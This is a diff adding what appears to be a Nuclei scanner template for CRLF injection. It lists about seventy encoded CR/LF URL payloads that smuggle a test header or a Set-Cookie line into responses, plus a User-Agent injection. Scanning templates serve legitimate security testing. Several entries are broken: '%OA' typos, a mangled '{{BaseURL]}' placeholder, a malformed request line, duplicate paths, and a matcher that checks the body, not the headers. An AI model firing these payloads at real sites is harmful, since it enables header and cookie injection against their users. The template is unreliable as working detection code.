@@ -1,0 +1,88 @@
+id: CRLF-vulnerbility
+info:
+  name: crlf injection 
+  severity: medium
+  author: lovelyboss
+  tags: crlf
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/%0ATest:BLATRUC"
+      - "{{BaseURL}}/%0A%20Test:BLATRUC"
+      - "{{BaseURL}}/%20%0ATest:BLATRUC"
+      - "{{BaseURL}}/%23%OATest:BLATRUC"
+      - "{{BaseURL}}/%E5%98%8A%E5%98%8DTest:BLATRUC"
+      - "{{BaseURL}}/%E5%98%8A%E5%98%8D%0ATest:BLATRUC"
+      - "{{BaseURL}}/%3F%0ATest:BLATRUC"
+      - "{{BaseURL}}/crlf%0ATest:BLATRUC"
+      - "{{BaseURL}}/crlf%0A%20Test:BLATRUC"
+      - "{{BaseURL}}/crlf%20%0ATest:BLATRUC"
+      - "{{BaseURL}}/crlf%23%OATest:BLATRUC"
+      - "{{BaseURL}}/crlf%E5%98%8A%E5%98%8DTest:BLATRUC"
+      - "{{BaseURL}}/crlf%E5%98%8A%E5%98%8D%0ATest:BLATRUC"
+      - "{{BaseURL}}/crlf%3F%0ATest:BLATRUC"
+      - "{{BaseURL}}/%0DTest:BLATRUC"
+      - "{{BaseURL}}/%0D%20Test:BLATRUC"
+      - "{{BaseURL}}/%20%0DTest:BLATRUC"
+      - "{{BaseURL}}/%23%0DTest:BLATRUC"
+      - "{{BaseURL}}/%23%0ATest:BLATRUC"
+      - "{{BaseURL}}/%E5%98%8A%E5%98%8DTest:BLATRUC"
+      - "{{BaseURL}}/%E5%98%8A%E5%98%8D%0DTest:BLATRUC"
+      - "{{BaseURL}}/%3F%0DTest:BLATRUC"
+      - "{{BaseURL}}/crlf%0DTest:BLATRUC"
+      - "{{BaseURL}}/crlf%0D%20Test:BLATRUC"
+      - "{{BaseURL}}/crlf%20%0DTest:BLATRUC"
+      - "{{BaseURL}}/crlf%23%0DTest:BLATRUC"
+      - "{{BaseURL}}/crlf%23%0ATest:BLATRUC"
+      - "{{BaseURL}}/crlf%E5%98%8A%E5%98%8DTest:BLATRUC"
+      - "{{BaseURL}}/crlf%E5%98%8A%E5%98%8D%0DTest:BLATRUC"
+      - "{{BaseURL}}/crlf%E5%98%8A%E5%98%8DTest:BLATRUC"
+      - "{{BaseURL}}/crlf%E5%98%8A%E5%98%8D%0DTest:BLATRUC"
+      - "{{BaseURL}}/crlf%3F%0DTest:BLATRUC"
+      - "{{BaseURL}}/%0D%0ATest:BLATRUC"
+      - "{{BaseURL}}/%0D%0A%20Test:BLATRUC"
+      - "{{BaseURL}}/%20%0D%0ATest:BLATRUC"
+      - "{{BaseURL}}/%23%0D%0ATest:BLATRUC"
+      - "{{BaseURL}}/\r\nTest:BLATRUC"
+      - "{{BaseURL}}/\r\n Test:BLATRUC"
+      - "{{BaseURL}}/\r\n Test:BLATRUC"
+      - "{{BaseURL}}/%5cr%5cnTest:BLATRUC"
+      - "{{BaseURL}}/%E5%98%8A%E5%98%8DTest:BLATRUC"
+      - "{{BaseURL}}/%E5%98%8A%E5%98%8D%0D%0ATest:BLATRUC"
+      - "{{BaseURL}}/%3F%0D%0ATest:BLATRUC"
+      - "{{BaseURL}}/crlf%0D%0ATest:BLATRUC"
+      - "{{BaseURL}}/crlf%0D%0A%20Test:BLATRUC"
+      - "{{BaseURL}}/crlf%20%0D%0ATest:BLATRUC"
+      - "{{BaseURL}}/crlf%23%0D%0ATest:BLATRUC"
+      - "{{BaseURL}}/crlf\r\nTest:BLATRUC"
+      - "{{BaseURL}}/crlf%5cr%5cnTest:BLATRUC"
+      - "{{BaseURL}}/crlf%E5%98%8A%E5%98%8DTest:BLATRUC"
+      - "{{BaseURL}}/crlf%E5%98%8A%E5%98%8D%0D%0ATest:BLATRUC"
+      - "{{BaseURL}}/crlf%3F%0D%0ATest:BLATRUC"
+      - "{{BaseURL}}/%0D%0A%09Test:BLATRUC"
+      - "{{BaseURL}}/crlf%0D%0A%09Test:BLATRUC"
+      - "{{BaseURL}}/%250ATest:BLATRUC"
+      - "{{BaseURL}}/%25250ATest:BLATRUC"
+      - "{{BaseURL}}/%%0A0ATest:BLATRUC"
+      - "{{BaseURL}}/%25%30ATest:BLATRUC"
+      - "{{BaseURL}}/%25%30%61Test:BLATRUC"
+      - "{{BaseURL}}%25%30%61Test:BLATRUC"
+      - "{{BaseURL}}%u000ATest:BLATRUC"
+      - "{{BaseURL}}//www.google.com/%2F..Test:BLATRUC"
+      - "{{BaseURL}}/www.google.com/%2E%2E%2F%0D%0ATest:BLATRUC"
+      - "{{BaseURL}}/google.com/%2F..%0D%0ATest:BLATRUC"
+      - "{{BaseURL}}/%0D%0A%20Set-Cookie:Test=BLATRUC"
+      - "{{BaseURL}}/%20%0D%0ASet-Cookie:Test=BLATRUC"
+      - "{{BaseURL]}/%0A%20Set-Cookie:Test=BLATRUC"
+      - "{{BaseURL}}/%2F%2E%2E%0D%0ASet-Cookie:Test=BLATRUC"
+  - raw:
+      - |
+        GET HTTP/1.1
+        Access-Control-Allow-Origin: true 
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 {{BaseURL}}%0D%0ACRLF-Test:BLATRUC%20User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
+            
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Test:BLATRUC"
